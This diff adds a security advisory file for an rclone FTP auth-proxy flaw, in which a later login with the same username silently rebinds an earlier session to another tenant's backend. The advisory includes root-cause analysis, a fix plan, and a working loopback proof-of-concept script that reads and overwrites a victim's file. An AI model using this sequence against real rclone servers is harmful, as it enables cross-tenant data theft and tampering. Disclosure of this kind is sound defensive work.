@@ -1,0 +1,58 @@
+{
+  "id": "GHSA-c476-6w5q-jw77",
+  "modified": "2026-09-10T23:00:05.152784696Z",
+  "published": "2026-09-10T22:46:33Z",
+  "aliases": [
+    "CVE-2026-88017"
+  ],
+  "summary": "rclone: FTP cross-session auth-proxy backend confusion",
+  "details": "## Summary\n\nThe FTP auth-proxy driver stores one obscured password per username in a server-wide map. It does not bind the credential or returned VFS to the authenticated FTP session. If two accepted credentials use the same username but resolve to different proxy backends, the later login overwrites the map entry. Subsequent operations on the first, still-authenticated session are re-authorized with the later session's password and execute against the later session's backend.\n\nThis is not exploitable in every auth-proxy deployment. It requires a proxy that accepts distinct credentials for the same username and returns different roots or backend configurations, plus a later login while the attacker's session remains open. The behavior is nevertheless within the supported model: `cmd/serve/proxy` keys VFS entries by username, authentication material, and client IP specifically so a new credential can produce a fresh backend.\n\nConfirmed affected versions are `v1.75.0` and development commit `5629f2668c69149bf3d9d8e2a25bb32a2648606e`. The username-global map was introduced in `v1.64.0`, but versions before credential-aware proxy caching may require cache expiration or different timing and are not claimed as confirmed here.\n\n## Affected Assets \u0026 Attack Surface\n\n- `cmd/serve/ftp/ftp.go:170-178` defines `userPass map[string]string` as driver-global state keyed only by username.\n- `cmd/serve/ftp/ftp.go:318-335` validates `(user, pass)` through the proxy and then overwrites `d.userPass[user]`.\n- `cmd/serve/ftp/ftp.go:352-373` retrieves the current map entry by `Sess.LoginUser()` for every filesystem operation and calls the proxy again with that password.\n- `cmd/serve/ftp/ftp.go:376` onward routes FTP filesystem operations through `getVFS`, including stat, listing, retrieval, upload, rename, and deletion.\n- `cmd/serve/proxy/proxy.go:114-119` documents credential- and client-IP-aware backend caching.\n- `cmd/serve/proxy/proxy.go:235-243` derives a cache key from username, credential, and client IP.\n- `cmd/serve/proxy/proxy.go:328-365` resolves and verifies the VFS using that composite identity.\n- Attack surface: any `rclone serve ftp --auth-proxy ...` deployment in which the proxy accepts more than one credential for a shared username and those credentials do not have equivalent backend authority.\n\n## Technical Root Cause Analysis\n\nAuthentication initially uses the correct session data:\n\n```go\nd.proxy.Call(user, pass, false, sctx.Sess.RemoteAddr().String())\n```\n\nAfter success, the driver discards the returned VFS and VFS cache key. It obscures the password and stores it in:\n\n```go\nd.userPass[user] = oPass\n```\n\nFor each later FTP operation, `getVFS` knows only the session's username. It looks up whichever password was most recently stored for that username and calls the proxy again. The mutex prevents a Go data race but does not provide session isolation.\n\nThe authorization sequence is therefore:\n\n1. Session A authenticates as `shared` with credential A and receives backend A.\n2. Session B authenticates as `shared` with credential B and overwrites `userPass[\"shared\"]`.\n3. Session A performs another FTP command.\n4. `getVFS` uses credential B, not the credential that authenticated Session A.\n5. The proxy returns backend B, and Session A's command runs there.\n\nThis creates a cross-session identity mismatch; no race condition is required. Credential-dependent routing is not an artificial assumption added by the PoC: the proxy cache deliberately distinguishes the same username with different authentication material. A proxy that maps username alone, rejects all concurrent alternate credentials, or binds credentials to client IP in a way that rejects the replay is not exploitable by this sequence.\n\n## Proof of Concept \u0026 Evidence\n\nCreate two roots and a proxy that uses the password as a tenant token while requiring the same FTP username:\n\n```sh\nmkdir -p /tmp/rclone-ftp-attacker /tmp/rclone-ftp-victim\nprintf 'attacker-only\\n' \u003e /tmp/rclone-ftp-attacker/attacker.txt\nprintf 'victim-secret\\n' \u003e /tmp/rclone-ftp-victim/victim.txt\n\ncat \u003e /tmp/rclone-ftp-proxy.py \u003c\u003c'PY'\n#!/usr/bin/env python3\nimport json\nimport sys\n\nrequest = json.load(sys.stdin)\nroots = {\n    \"attacker-token\": \"/tmp/rclone-ftp-attacker\",\n    \"victim-token\": \"/tmp/rclone-ftp-victim\",\n}\n\nif request.get(\"user\") != \"shared\" or request.get(\"pass\") not in roots:\n    sys.exit(1)\n\nprint(json.dumps({\n    \"type\": \"local\",\n    \"_root\": roots[request[\"pass\"]],\n}))\nPY\nchmod 700 /tmp/rclone-ftp-proxy.py\n```\n\nStart the FTP server on loopback:\n\n```sh\n./rclone serve ftp \\\n  --auth-proxy \"python3 /tmp/rclone-ftp-proxy.py\" \\\n  --addr 127.0.0.1:2121 \\\n  --passive-port 30000-30010\n```\n\nIn another terminal, keep both sessions open and trigger the overwrite:\n\n```sh\npython3 - \u003c\u003c'PY'\nimport ftplib\nimport io\n\ndef connect(password):\n    ftp = ftplib.FTP()\n    ftp.connect(\"127.0.0.1\", 2121, timeout=5)\n    ftp.login(\"shared\", password)\n    return ftp\n\nattacker = connect(\"attacker-token\")\n\n# Establish the attacker's original authority.\noriginal = bytearray()\nattacker.retrbinary(\"RETR attacker.txt\", original.extend)\nassert original == b\"attacker-only\\n\"\n\ntry:\n    attacker.size(\"victim.txt\")\n    raise AssertionError(\"victim file unexpectedly visible before overwrite\")\nexcept ftplib.error_perm:\n    pass\n\n# A second principal logs in with the same username and a different token.\nvictim = connect(\"victim-token\")\nassert victim.size(\"victim.txt\") \u003e 0\n\n# The first session is now silently rebound to the victim backend.\nstolen = bytearray()\nattacker.retrbinary(\"RETR victim.txt\", stolen.extend)\nprint(stolen.decode().strip())\nattacker.storbinary(\"STOR victim.txt\", io.BytesIO(b\"modified-by-first-session\\n\"))\n\nattacker.quit()\nvictim.quit()\nPY\n\ngrep -F modified-by-first-session /tmp/rclone-ftp-victim/victim.txt\n```\n\nObserved against `5629f2668c69149bf3d9d8e2a25bb32a2648606e`:\n\n- Before the victim login, the attacker session resolves only the attacker root.\n- After the victim login, the already-authenticated attacker session reads `victim.txt`.\n- A write through the attacker session overwrites the file in the victim root.\n\nThe complete automated validation used the actual FTP listener, two simultaneous `github.com/jlaffaye/ftp` clients, and an external auth-proxy process that mapped the two tokens to separate temporary local roots. It verified the precondition that `victim.txt` was unavailable to the first session before the second login, then verified both cross-root read and overwrite after the login. It passed on Windows/amd64 with Go 1.26.2:\n\n```text\n=== RUN   TestSecurityValidationFTPAuthProxyCrossSession\n--- PASS: TestSecurityValidationFTPAuthProxyCrossSession (2.11s)\n```\n\nBoth PoC sessions use loopback, so they have the same client IP and the test isolates the credential-keying defect. Across different client IPs, the issue remains reachable when the proxy does not bind credentials to source addresses. If the proxy enforces such a binding, replay of the victim credential may fail and that deployment is not exploitable by this sequence.\n\n## Impact Assessment\n\nA low-privileged user with a valid auth-proxy credential can gain the read, write, and delete authority of another accepted credential sharing the same FTP username. The unauthorized capability is direct: the first session operates on the second credential's VFS without authenticating with that credential.\n\nThe maximum impact is cross-tenant disclosure, modification, and deletion of all objects exposed by the victim backend. Actual severity is lower when all credentials for a username intentionally represent the same principal and equivalent root. The victim or an automated client must log in after the attacker, and the attacker must keep the original FTP session open.\n\nThis is not a generic FTP username-enumeration issue and does not give an unauthenticated party access. It is a session-isolation failure in auth-proxy mode.\n\n## Remediation Guidance\n\nBind the credential or backend identity to the FTP session, never to the username. `goftp.io/server/v2` exposes `sctx.Sess.Data`, which persists across commands for one session and is released with that session.\n\nA compatible fix is:\n\n1. On successful `CheckPasswd`, store a private session binding in `sctx.Sess.Data`. The binding can contain the obscured password and username, or another opaque value sufficient to resolve the same proxy entry.\n2. In `getVFS`, retrieve only that session binding. Never consult a driver-global username map.\n3. If re-authentication occurs on the same FTP session, replace the binding only after the new authentication succeeds; clear it on a failed authentication attempt where the library keeps the session alive.\n4. Preserve proxy cache expiry semantics. Holding a VFS pointer forever would prevent the existing cache from expiring it; storing the session's obscured credential and re-calling `Proxy.Call` retains current expiry behavior while maintaining identity.\n5. Remove `userPass`, `userPassMu`, and the associated global credential lifetime after the session-based path is in place.\n\nAvoid keying a replacement map by remote address, username, or client IP. Multiple sessions can share all of those values. If a library limitation makes `Session.Data` unsuitable, use the `*ftp.Session` pointer as the key and add reliable disconnect cleanup; session-owned state is preferable because cleanup is automatic.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/rclone/rclone",
+        "purl": "pkg:golang/github.com/rclone/rclone"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "1.64.0"
+            },
+            {
+              "fixed": "1.75.1"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 1.75.0",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-c476-6w5q-jw77/GHSA-c476-6w5q-jw77.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/rclone/rclone/security/advisories/GHSA-c476-6w5q-jw77"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-88017"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/rclone/rclone/commit/c6af0b57c2b4af848bc968c2b407354476184b99"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/rclone/rclone"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/rclone/rclone/releases/tag/v1.75.1"
+    }
+  ]
+}
